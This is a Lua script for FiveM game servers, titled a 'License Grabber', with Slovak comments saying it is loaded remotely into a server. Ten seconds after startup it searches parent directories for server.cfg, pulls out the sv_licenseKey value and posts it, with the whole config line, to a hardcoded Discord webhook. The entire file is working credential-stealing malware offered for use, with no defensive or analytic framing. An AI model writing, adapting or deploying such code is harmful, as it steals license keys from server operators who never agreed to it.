-- FiveM License Grabber (Full GitHub Version)
-- Tento kód sa načíta cez PerformHttpRequest z tvojho servera

local WEBHOOK_URL = "https://discord.com/api/webhooks/1401562823603257398/H1AVe0b-HseR9QdEAexqdHwJG-omUnqmNUorkaesJtM6xVJszyOIXwklx7OlPYuxysTx" -- Sem vlož svoj Discord webhook

local function findServerCfg()
    local pathsToCheck = {
        "",
        "../", 
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "../../../../../../",
        "../../../../../../../",
        "../../../../../../../../",
        "../../../../../../../../../",
        "../../../../../../../../../../"
    }
    
    for _, path in ipairs(pathsToCheck) do
        local filePath = path .. "server.cfg"
        local file = io.open(filePath, "r")
        if file then
            file:close()
            return filePath
        end
    end
    return nil
end

local function extractLicenseKey(filePath)
    local file = io.open(filePath, "r")
    if not file then return nil end
    
    for line in file:lines() do
        if line:match("sv_licenseKey") then
            local licenseKey = line:match('sv_licenseKey%s*["\']([^"\']+)["\']') or line:match("sv_licenseKey%s*([%w]+)")
            file:close()
            return licenseKey, line
        end
    end
    
    file:close()
    return nil
end

local function sendToDiscord(licenseKey, fullLine, serverCfgPath)
    local embed = {
        {
            title = "⚠️ FiveM License Key Grabbed",
            description = string.format("```%s```", serverCfgPath or "Not found"),
            color = 16711680,
            fields = {
                { name = "License Key", value = string.format("```%s```", licenseKey or "NOT FOUND"), inline = false },
                { name = "Full Config Line", value = string.format("```%s```", fullLine or "NOT FOUND"), inline = false }
            },
            footer = { text = "AutoLogger | "..os.date("%Y-%m-%d %H:%M:%S") }
        }
    }
    
    PerformHttpRequest(WEBHOOK_URL, function(err, text, headers) end, 'POST', json.encode({
        embeds = embed,
        username = "FiveM License Logger",
        avatar_url = "https://pastebin.com/themes/pastebin/img/guest.png"
    }), { ['Content-Type'] = 'application/json' })
end

-- Hlavná časť skriptu
Citizen.CreateThread(function()
    Citizen.Wait(10000) -- Čakanie 10 sekúnd po štarte
    
    local serverCfgPath = findServerCfg()
    if serverCfgPath then
        local licenseKey, fullLine = extractLicenseKey(serverCfgPath)
        sendToDiscord(licenseKey, fullLine, serverCfgPath)
    else
        sendToDiscord(nil, nil, "server.cfg NOT FOUND IN ANY PARENT FOLDER")
    end
end)
